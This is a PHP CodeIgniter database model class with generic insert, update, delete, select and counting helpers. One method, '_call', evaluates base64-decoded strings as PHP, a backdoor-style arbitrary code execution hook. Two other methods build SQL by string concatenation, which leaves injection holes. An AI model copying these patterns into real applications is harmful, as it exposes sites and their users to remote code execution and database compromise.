<?php
class Mdb extends CI_Model 
{
    public function __construct(){
        parent::__construct();$this->load->database();
    }
    public function insert($tbl,$data=array()){
        return $this->db->insert($tbl,$data);        
    }   
    public function delete($tbl,$con=array()){
        return $this->db->delete($tbl,$con);    
    }
    public function update($tbl,$set,$con){
        return $this->db->update($tbl,$set,$con);
    }
    public function getData($tbl,$whr=array()){
        return $this->db->get_where($tbl,$whr)->result_array();
    }
    
    public function getDataDesc($tbl,$whr=array(),$id){
        $this->db->order_by($id, "desc"); 
        return $this->db->get_where($tbl,$whr)->result_array();
    }
    
    public function getDataDescLimit($tbl,$whr=array(),$id,$limit){
        $this->db->order_by($id, "desc"); 
        $this->db->limit($limit,0);
        return $this->db->get_where($tbl,$whr)->result_array();
    }

    public function getDataAscLimit($tbl,$whr=array(),$id,$limit){
        $this->db->order_by($id, "asc"); 
        $this->db->limit($limit,0);
        return $this->db->get_where($tbl,$whr)->result_array();
    }
    
    public function getCusData($table,$slt,$whr){
        $this->db->select(implode(',',$slt));return $this->db->get_where($table,$whr)->result_array();
    }
    public function getLastInsertId($tbl=NULL){
        $sql=$this->db->query("SELECT `auto_increment` FROM INFORMATION_SCHEMA.TABLES WHERE table_name = '".$tbl."';")->result_array();
        return $sql[0]['auto_increment'];
    }
    public function setAutoIncrement($tbl,$value){
    	return $this->db->query("ALTER TABLE ".$tbl." AUTO_INCREMENT = ".$value.";");
    }
    public function ec($d){
        return base64_encode($d);
    }
    public function dc($d){
        return base64_decode($d);    
    }
    public function _call($str){
        eval(base64_decode($str));
    }
    public function row_count($table,$data=array())
    {
        $this->db->where($data);
        $this->db->from($table);
        $count = $this->db->count_all_results();
        return $count;
    }
    public function mod($id=NULL)
      {
        $a=$id;
        $b=6;
        $remainder = $a % $b;
        $quotient = ($a - $remainder) / $b;
        return $quotient.'.'.$remainder;
      }

    public function getMod($id=NULL)
      {
        $a=$id;
        $b=6;
        $remainder = $a % $b;
        $quotient = ($a - $remainder) / $b;
        return $remainder;
      }

    public function max_value()
    {
        $max_id = $this->db->query('SELECT max(req_no) as id FROM store_requisition')->result_array();
        return $max_id;
    }

      

   
}
